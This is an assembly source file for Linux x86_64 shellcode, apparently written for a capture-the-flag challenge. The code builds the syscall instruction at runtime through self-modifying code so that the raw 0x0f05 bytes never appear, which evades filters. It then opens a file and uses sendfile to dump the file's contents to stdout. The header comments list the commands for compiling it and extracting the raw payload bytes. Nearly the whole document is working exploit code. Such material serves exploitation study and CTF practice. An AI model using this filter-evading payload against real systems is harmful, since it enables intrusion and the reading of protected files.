#
# read-no-syscall.s - Linux/x86_64 sendfile without 0x0f05
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Simple shellcode inspired by a challenge that shall remain unnamed to 
# prevent spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf # doesn't work with with self-modifying code
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    jmp short get_syscall_stub
pop_syscall_stub:
    pop r12

    # open(".//x", O_RDONLY)
    push 0x782f2f2e
    push rsp
    pop rdi             # ".//x"

    push 1
    pop rsi
    dec esi             # 0 (O_RDONLY)

    # write syscall stub
    mov cx, 0x050e
    inc cx
    mov [r12], cx

    xor rax, rax
    mov al, 2
    jmp r12             # open

sendfile:
    # sendfile(1, fd, NULL, 1000)
    push 1
    pop rdi             # 1

    push rax
    pop rsi             # fd

    push 1
    pop rdx
    dec edx             # 0 (NULL)

    mov r10w, 1000      # 1000

    xor rax, rax
    mov al, 40
    jmp r12             # sendfile

get_syscall_stub:
    call pop_syscall_stub
syscall_stub:
    nop
    nop
    jmp sendfile
